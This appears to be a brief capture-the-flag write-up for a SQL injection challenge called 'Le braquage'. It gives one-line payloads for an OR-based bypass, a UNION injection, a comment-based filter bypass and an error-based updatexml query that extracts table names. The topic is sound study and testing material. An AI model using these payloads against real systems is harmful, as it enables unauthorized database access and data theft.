# Le braquage

This challenge focuses on SQL injections.

## Page1

OR based SQLI
```
' or '1'='1
```

## Page2

UNION based SQLI
```
' union select 1-- -
```

## Page3

Filter bypass
```
'/**/or/**/'1'='1
```

Error based
```
' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```
